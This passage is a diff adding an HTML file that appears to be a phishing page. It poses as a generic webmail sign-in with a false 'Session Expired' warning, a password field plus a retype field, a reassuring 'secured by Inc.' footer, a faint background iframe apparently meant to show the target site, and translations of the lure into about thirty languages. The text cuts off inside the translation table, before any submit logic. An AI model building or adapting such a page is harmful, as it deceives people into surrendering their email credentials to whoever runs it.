@@ -1,0 +1,889 @@
+<!DOCTYPE html>
+<html id="html-root">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Webmail Login</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #808080;
+      font-family: Arial, sans-serif;
+    }
+    iframe#background-frame {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      z-index: -1;
+      opacity: 0.1;
+      pointer-events: none;
+    }
+    .login-container {
+      background-color: #f4f4f4;
+      width: 350px;
+      margin: 100px auto;
+      padding: 40px 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+      position: relative;
+      text-align: center;
+    }
+    .login-container img {
+      width: 80px;
+      height: 80px;
+      background-color: #f60;
+      border-radius: 50%;
+      position: absolute;
+      top: -40px;
+      left: calc(50% - 40px);
+      padding: 10px;
+    }
+    .login-container h2 {
+      margin-top: 50px;
+      color: blue;
+    }
+    .login-container p#session-expired {
+      color: red;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    .login-container input[type="text"],
+    .login-container input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+      font-size: 14px;
+    }
+    .login-container label {
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      margin: 5px 0;
+      text-align: left;
+    }
+    .login-container label input[type="checkbox"] {
+      margin-right: 8px;
+    }
+    .login-container .secure-icon {
+      font-size: 14px;
+      margin-left: 5px;
+      cursor: pointer;
+    }
+    .login-container .forgot-password {
+      float: right;
+      font-size: 14px;
+      margin-top: -22px;
+      color: #007bff;
+      text-decoration: none;
+    }
+    .login-container button {
+      background-color: #28a745;
+      color: white;
+      padding: 10px;
+      width: 100%;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .footer {
+      text-align: center;
+      font-size: 13px;
+      margin-top: 20px;
+      color: #333;
+    }
+    .footer .secure-shield {
+      color: green;
+      font-size: 16px;
+      margin-right: 5px;
+    }
+    .error {
+      color: red;
+      font-size: 13px;
+      margin-top: -5px;
+    }
+    @keyframes shake {
+      0% { transform: translateX(0); }
+      20% { transform: translateX(-5px); }
+      40% { transform: translateX(5px); }
+      60% { transform: translateX(-5px); }
+      80% { transform: translateX(5px); }
+      100% { transform: translateX(0); }
+    }
+    .shake {
+      animation: shake 0.5s;
+      border: 2px solid red !important;
+    }
+  </style>
+</head>
+<body>
+  <iframe id="background-frame" src=""></iframe>
+
+  <div class="login-container">
+    <img src="data:image/png;base64,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" alt="Mail Icon" />
+    <h2>Webmail</h2>
+    <p id="session-expired">⚠️ Session Expired. Please sign in again.</p>
+    <input type="text" id="email" placeholder="Email address" />
+    <input type="password" id="password" placeholder="Password" />
+    <input type="password" id="confirmPassword" placeholder="Retype Password" />
+    <div class="error" id="error-message"></div>
+    <label><input type="checkbox" id="secure-check" /> <span id="secure-label">Always Secure</span> <span class="secure-icon">🔒</span></label>
+    <label><input type="checkbox" id="private-check" /> <span id="private-label">Private computer</span></label>
+    <a class="forgot-password" href="#" id="forgot-link">Forgot Password?</a>
+    <button onclick="submitForm()" id="submit-btn">Sign in</button>
+    <div class="footer">
+      <span class="secure-shield">🛡️</span> This is secured by <strong>Inc.</strong> © 2025
+    </div>
+  </div>
+
+  <script>
+  const translations = {
+    en: {
+      title: "Webmail",
+      sessionExpired: "Session Expired. Please sign in again.",
+      email: "Email address",
+      password: "Password",
+      retypePassword: "Retype Password",
+      alwaysSecure: "Always Secure",
+      privateComputer: "Private computer",
+      forgotPassword: "Forgot Password?",
+      signIn: "Sign in",
+      footer: "This is secured by Inc. © 2025",
+      passwordMismatch: "Passwords do not match!"
+    },
+    fr: {
+      title: "Webmail",
+      sessionExpired: "Session expirée. Veuillez vous reconnecter.",
+      email: "Adresse e-mail",
+      password: "Mot de passe",
+      retypePassword: "Retapez le mot de passe",
+      alwaysSecure: "Toujours sécurisé",
+      privateComputer: "Ordinateur privé",
+      forgotPassword: "Mot de passe oublié ?",
+      signIn: "Se connecter",
+      footer: "Ceci est sécurisé par Inc. © 2025",
+      passwordMismatch: "Les mots de passe ne correspondent pas !"
+	  
+    },
+    es: {
+     title: "Correo web",
+     sessionExpired: "Sesión expirada. Por favor, inicie sesión de nuevo.",
+     email: "Dirección de correo electrónico",
+     password: "Contraseña",
+     retypePassword: "Vuelva a escribir la contraseña",
+     alwaysSecure: "Siempre seguro",
+     privateComputer: "Computadora privada",
+     forgotPassword: "¿Olvidó su contraseña?",
+     signIn: "Iniciar sesión",
+     footer: "Esto está asegurado por Inc. © 2025",
+     passwordMismatch: "¡Las contraseñas no coinciden!"
+    },
+    ja: {
+     title: "ウェブメール",
+     sessionExpired: "セッションの有効期限が切れました。もう一度サインインしてください。",
+     email: "メールアドレス",
+     password: "パスワード",
+     retypePassword: "パスワードを再入力",
+     alwaysSecure: "常にセキュア",
+     privateComputer: "プライベートコンピュータ",
+     forgotPassword: "パスワードをお忘れですか？",
+     signIn: "サインイン",
+     footer: "これはInc.によって保護されています。© 2025",
+     passwordMismatch: "パスワードが一致しません！"
+    },
+    zh: {
+     title: "网页邮箱",
+     sessionExpired: "会话已过期。请重新登录。",
+     email: "电子邮件地址",
+     password: "密码",
+     retypePassword: "重新输入密码",
+     alwaysSecure: "始终安全",
+     privateComputer: "私人电脑",
+     forgotPassword: "忘记密码？",
+     signIn: "登录",
+     footer: "由 Inc. 提供安全保障 © 2025",
+     passwordMismatch: "密码不匹配！"
+    },
+    vi: {
+     title: "Thư web",
+     sessionExpired: "Phiên làm việc đã hết hạn. Vui lòng đăng nhập lại.",
+     email: "Địa chỉ email",
+     password: "Mật khẩu",
+     retypePassword: "Nhập lại mật khẩu",
+     alwaysSecure: "Luôn bảo mật",
+     privateComputer: "Máy tính cá nhân",
+     forgotPassword: "Quên mật khẩu?",
+     signIn: "Đăng nhập",
+     footer: "Được bảo mật bởi Inc. © 2025",
+     passwordMismatch: "Mật khẩu không khớp!"
+    },
+    de: {
+     title: "Webmail",
+     sessionExpired: "Sitzung abgelaufen. Bitte erneut anmelden.",
+     email: "E-Mail-Adresse",
+     password: "Passwort",
+     retypePassword: "Passwort erneut eingeben",
+     alwaysSecure: "Immer sicher",
+     privateComputer: "Privater Computer",
+     forgotPassword: "Passwort vergessen?",
+     signIn: "Anmelden",
+     footer: "Dies ist gesichert von Inc. © 2025",
+     passwordMismatch: "Passwörter stimmen nicht überein!"
+    },
+    it: {
+     title: "Posta Web",
+     sessionExpired: "Sessione scaduta. Effettua nuovamente l'accesso.",
+     email: "Indirizzo email",
+     password: "Password",
+     retypePassword: "Reinserisci la password",
+     alwaysSecure: "Sempre sicuro",
+     privateComputer: "Computer privato",
+     forgotPassword: "Hai dimenticato la password?",
+     signIn: "Accedi",
+     footer: "Protetto da Inc. © 2025",
+     passwordMismatch: "Le password non corrispondono!"
+    },
+    ru: {
+     title: "Веб-почта",
+     sessionExpired: "Сессия истекла. Пожалуйста, войдите снова.",
+     email: "Адрес электронной почты",
+     password: "Пароль",
+     retypePassword: "Повторите пароль",
+     alwaysSecure: "Всегда безопасно",
+     privateComputer: "Личный компьютер",
+     forgotPassword: "Забыли пароль?",
+     signIn: "Войти",
+     footer: "Защищено Inc. © 2025",
+     passwordMismatch: "Пароли не совпадают!"
+    },
+    pt: {
+     title: "Correio Web",
+     sessionExpired: "Sessão expirada. Por favor, faça login novamente.",
+     email: "Endereço de e-mail",
+     password: "Senha",
+     retypePassword: "Redigite a senha",
+     alwaysSecure: "Sempre seguro",
+     privateComputer: "Computador privado",
+     forgotPassword: "Esqueceu a senha?",
+     signIn: "Entrar",
+     footer: "Protegido por Inc. © 2025",
+     passwordMismatch: "As senhas não coincidem!"
+	},
+	ko: {
+     title: "웹메일",
+     sessionExpired: "세션이 만료되었습니다. 다시 로그인해 주세요.",
+     email: "이메일 주소",
+     password: "비밀번호",
+     retypePassword: "비밀번호 다시 입력",
+     alwaysSecure: "항상 안전하게",
+     privateComputer: "개인용 컴퓨터",
+     forgotPassword: "비밀번호를 잊으셨나요?",
+     signIn: "로그인",
+     footer: "Inc.에 의해 보호됩니다 © 2025",
+     passwordMismatch: "비밀번호가 일치하지 않습니다!"
+    },
+    ar: {
+     title: "بريد الويب",
+     sessionExpired: "انتهت الجلسة. يرجى تسجيل الدخول مرة أخرى.",
+     email: "عنوان البريد الإلكتروني",
+     password: "كلمة المرور",
+     retypePassword: "أعد إدخال كلمة المرور",
+     alwaysSecure: "دائمًا آمن",
+     privateComputer: "كمبيوتر خاص",
+     forgotPassword: "هل نسيت كلمة المرور؟",
+     signIn: "تسجيل الدخول",
+     footer: "محمي بواسطة Inc. © 2025",
+     passwordMismatch: "كلمتا المرور غير متطابقتين!"
+    },
+    tr: {
+     title: "Web posta",
+     sessionExpired: "Oturum süresi doldu. Lütfen tekrar giriş yapın.",
+     email: "E-posta adresi",
+     password: "Şifre",
+     retypePassword: "Şifreyi tekrar girin",
+     alwaysSecure: "Her zaman güvenli",
+     privateComputer: "Özel bilgisayar",
+     forgotPassword: "Şifrenizi mi unuttunuz?",
+     signIn: "Giriş yap",
+     footer: "Inc. tarafından korunmaktadır © 2025",
+     passwordMismatch: "Şifreler uyuşmuyor!"
+    },
+    hi: {
+     title: "वेबमेल",
+     sessionExpired: "सत्र समाप्त हो गया है। कृपया फिर से साइन इन करें।",
+     email: "ईमेल पता",
+     password: "पासवर्ड",
+     retypePassword: "पासवर्ड दोबारा दर्ज करें",
+     alwaysSecure: "हमेशा सुरक्षित",
+     privateComputer: "निजी कंप्यूटर",
+     forgotPassword: "पासवर्ड भूल गए?",
+     signIn: "साइन इन करें",
+     footer: "Inc. द्वारा सुरक्षित © 2025",
+     passwordMismatch: "पासवर्ड मेल नहीं खाते!"
+	 
+	},
+    pl: {
+     title: "Poczta internetowa",
+     sessionExpired: "Sesja wygasła. Zaloguj się ponownie.",
+     email: "Adres e-mail",
+     password: "Hasło",
+     retypePassword: "Wpisz hasło ponownie",
+     alwaysSecure: "Zawsze bezpieczne",
+     privateComputer: "Komputer prywatny",
+     forgotPassword: "Zapomniałeś hasła?",
+     signIn: "Zaloguj się",
+     footer: "Zabezpieczone przez Inc. © 2025",
+     passwordMismatch: "Hasła nie pasują do siebie!"
+    },
+    nl: {
+     title: "Webmail",
+     sessionExpired: "Sessie verlopen. Meld je opnieuw aan.",
+     email: "E-mailadres",
+     password: "Wachtwoord",
+     retypePassword: "Herhaal wachtwoord",
+     alwaysSecure: "Altijd veilig",
+     privateComputer: "Privécomputer",
+     forgotPassword: "Wachtwoord vergeten?",
+     signIn: "Inloggen",
+     footer: "Beveiligd door Inc. © 2025",
+     passwordMismatch: "Wachtwoorden komen niet overeen!"
+    },
+    th: {
+     title: "เว็บเมล",
+     sessionExpired: "เซสชันหมดอายุ กรุณาเข้าสู่ระบบอีกครั้ง",
+     email: "ที่อยู่อีเมล",
+     password: "รหัสผ่าน",
+     retypePassword: "ป้อนรหัสผ่านอีกครั้ง",
+     alwaysSecure: "ปลอดภัยเสมอ",
+     privateComputer: "คอมพิวเตอร์ส่วนตัว",
+     forgotPassword: "ลืมรหัสผ่าน?",
+     signIn: "เข้าสู่ระบบ",
+     footer: "ได้รับการป้องกันโดย Inc. © 2025",
+     passwordMismatch: "รหัสผ่านไม่ตรงกัน!"
+    },
+    id: {
+     title: "Webmail",
+     sessionExpired: "Sesi telah berakhir. Silakan masuk kembali.",
+     email: "Alamat email",
+     password: "Kata sandi",
+     retypePassword: "Ketik ulang kata sandi",
+     alwaysSecure: "Selalu aman",
+     privateComputer: "Komputer pribadi",
+     forgotPassword: "Lupa kata sandi?",
+     signIn: "Masuk",
+     footer: "Dilindungi oleh Inc. © 2025",
+     passwordMismatch: "Kata sandi tidak cocok!"
+    },
+    ms: {
+     title: "Mel web",
+     sessionExpired: "Sesi telah tamat. Sila log masuk semula.",
+     email: "Alamat e-mel",
+     password: "Kata laluan",
+     retypePassword: "Taip semula kata laluan",
+     alwaysSecure: "Sentiasa selamat",
+     privateComputer: "Komputer peribadi",
+     forgotPassword: "Terlupa kata laluan?",
+     signIn: "Log masuk",
+     footer: "Dilindungi oleh Inc. © 2025",
+     passwordMismatch: "Kata laluan tidak sepadan!"
+    },
+    he: {
+     title: "דואר אינטרנט",
+     sessionExpired: "החיבור פג. אנא התחבר שוב.",
+     email: "כתובת אימייל",
+     password: "סיסמה",
+     retypePassword: "הקלד סיסמה שוב",
+     alwaysSecure: "תמיד מאובטח",
+     privateComputer: "מחשב אישי",
+     forgotPassword: "שכחת סיסמה?",
+     signIn: "התחבר",
+     footer: "מאובטח על ידי Inc. © 2025",
+     passwordMismatch: "הסיסמאות אינן תואמות!"
+    },
+    uk: {
+     title: "Вебпошта",
+     sessionExpired: "Сесію завершено. Увійдіть знову.",
+     email: "Електронна адреса",
+     password: "Пароль",
+     retypePassword: "Повторіть пароль",
+     alwaysSecure: "Завжди безпечно",
+     privateComputer: "Приватний комп’ютер",
+     forgotPassword: "Забули пароль?",
+     signIn: "Увійти",
+     footer: "Захищено Inc. © 2025",
+     passwordMismatch: "Паролі не збігаються!"
+    },
+    sv: {
+     title: "Webbmail",
+     sessionExpired: "Sessionen har gått ut. Logga in igen.",
+     email: "E-postadress",
+     password: "Lösenord",
+     retypePassword: "Skriv lösenordet igen",
+     alwaysSecure: "Alltid säkert",
+     privateComputer: "Privat dator",
+     forgotPassword: "Glömt lösenordet?",
+     signIn: "Logga in",
+     footer: "Skyddad av Inc. © 2025",
+     passwordMismatch: "Lösenorden matchar inte!"
+    },
+    fi: {
+     title: "Verkkoposti",
+     sessionExpired: "Istunto on vanhentunut. Kirjaudu sisään uudelleen.",
+     email: "Sähköpostiosoite",
+     password: "Salasana",
+     retypePassword: "Toista salasana",
+     alwaysSecure: "Aina turvallinen",
+     privateComputer: "Yksityinen tietokone",
+     forgotPassword: "Unohditko salasanan?",
+     signIn: "Kirjaudu sisään",
+     footer: "Suojattu Inc.:n toimesta © 2025",
+     passwordMismatch: "Salasanat eivät täsmää!"
+    },
+    ro: {
+     title: "Mail web",
+     sessionExpired: "Sesiunea a expirat. Vă rugăm să vă autentificați din nou.",
+     email: "Adresă de email",
+     password: "Parolă",
+     retypePassword: "Reintroduceți parola",
+     alwaysSecure: "Întotdeauna sigur",
+     privateComputer: "Computer privat",
+     forgotPassword: "Ați uitat parola?",
+     signIn: "Autentificare",
+     footer: "Protejat de Inc. © 2025",
+     passwordMismatch: "Parolele nu se potrivesc!"
+    },
+    bn: {
+     title: "ওয়েবমেইল",
+     sessionExpired: "সেশন শেষ হয়েছে। অনুগ্রহ করে পুনরায় সাইন ইন করুন।",
+     email: "ইমেইল ঠিকানা",
+     password: "পাসওয়ার্ড",
+     retypePassword: "পাসওয়ার্ড পুনরায় টাইপ করুন",
+     alwaysSecure: "সবসময় নিরাপদ",
+     privateComputer: "ব্যক্তিগত কম্পিউটার",
+     forgotPassword: "পাসওয়ার্ড ভুলে গেছেন?",
+     signIn: "সাইন ইন",
+     footer: "এইটি Inc. দ্বারা সুরক্ষিত © 2025",
+     passwordMismatch: "পাসওয়ার্ড মিলছে না!"
+    },
+    el: {
+     title: "Ιστότοπος Email",
+     sessionExpired: "Η συνεδρία έληξε. Παρακαλώ συνδεθείτε ξανά.",
+     email: "Διεύθυνση email",
+     password: "Κωδικός πρόσβασης",
+     retypePassword: "Επαναλάβετε τον κωδικό πρόσβασης",
+     alwaysSecure: "Πάντα ασφαλές",
+     privateComputer: "Προσωπικός υπολογιστής",
+     forgotPassword: "Ξεχάσατε τον κωδικό;",
+     signIn: "Σύνδεση",
+     footer: "Προστατεύεται από την Inc. © 2025",
+     passwordMismatch: "Οι κωδικοί δεν ταιριάζουν!"
+    },
+    cs: {
+     title: "Webmail",
+     sessionExpired: "Relace vypršela. Přihlaste se znovu.",
+     email: "E-mailová adresa",
+     password: "Heslo",
+     retypePassword: "Zadejte heslo znovu",
+     alwaysSecure: "Vždy zabezpečeno",
+     privateComputer: "Soukromý počítač",
+     forgotPassword: "Zapomněli jste heslo?",
+     signIn: "Přihlásit se",
+     footer: "Zabezpečeno Inc. © 2025",
+     passwordMismatch: "Hesla se neshodují!"
+    },
+    hu: {
+     title: "Webmail",
+     sessionExpired: "A munkamenet lejárt. Kérjük, jelentkezzen be újra.",
+     email: "Email cím",
+     password: "Jelszó",
+     retypePassword: "Jelszó újra",
+     alwaysSecure: "Mindig biztonságos",
+     privateComputer: "Személyi számítógép",
+     forgotPassword: "Elfelejtett jelszó?",
+     signIn: "Bejelentkezés",
+     footer: "Védett az Inc. által © 2025",
+     passwordMismatch: "A jelszavak nem egyeznek!"
+    },
+    no: {
+     title: "Webmail",
+     sessionExpired: "Økten er utløpt. Vennligst logg inn igjen.",
+     email: "E-postadresse",
+     password: "Passord",
+     retypePassword: "Skriv inn passord på nytt",
+     alwaysSecure: "Alltid sikkert",
+     privateComputer: "Privat datamaskin",
+     forgotPassword: "Glemt passord?",
+     signIn: "Logg inn",
+     footer: "Sikret av Inc. © 2025",
+     passwordMismatch: "Passordene samsvarer ikke!"
+    },
+    da: {
+     title: "Webmail",
+     sessionExpired: "Sessionen er udløbet. Log venligst ind igen.",
+     email: "E-mailadresse",
+     password: "Adgangskode",
+     retypePassword: "Gentag adgangskode",
+     alwaysSecure: "Altid sikker",
+     privateComputer: "Privat computer",
+     forgotPassword: "Glemt adgangskode?",
+     signIn: "Log ind",
+     footer: "Sikret af Inc. © 2025",
+     passwordMismatch: "Adgangskoderne stemmer ikke overens!"
+    },
+    sk: {
+     title: "Webmail",
+     sessionExpired: "Relácia vypršala. Prihláste sa znova.",
+     email: "Emailová adresa",
+     password: "Heslo",
+     retypePassword: "Zadajte heslo znova",
+     alwaysSecure: "Vždy bezpečné",
+     privateComputer: "Súkromný počítač",
+     forgotPassword: "Zabudli ste heslo?",
+     signIn: "Prihlásiť sa",
+     footer: "Chránené spoločnosťou Inc. © 2025",
+     passwordMismatch: "Heslá sa nezhodujú!"
+    },
+    bg: {
+     title: "Уеб поща",
+     sessionExpired: "Сесията е изтекла. Моля, влезте отново.",
+     email: "Имейл адрес",
+     password: "Парола",
+     retypePassword: "Въведете паролата отново",
+     alwaysSecure: "Винаги защитено",
+     privateComputer: "Личен компютър",
+     forgotPassword: "Забравена парола?",
+     signIn: "Вход",
+     footer: "Защитено от Inc. © 2025",
+     passwordMismatch: "Паролите не съвпадат!"
+    },
+    hr: {
+     title: "Webmail",
+     sessionExpired: "Sesija je istekla. Molimo prijavite se ponovno.",
+     email: "Email adresa",
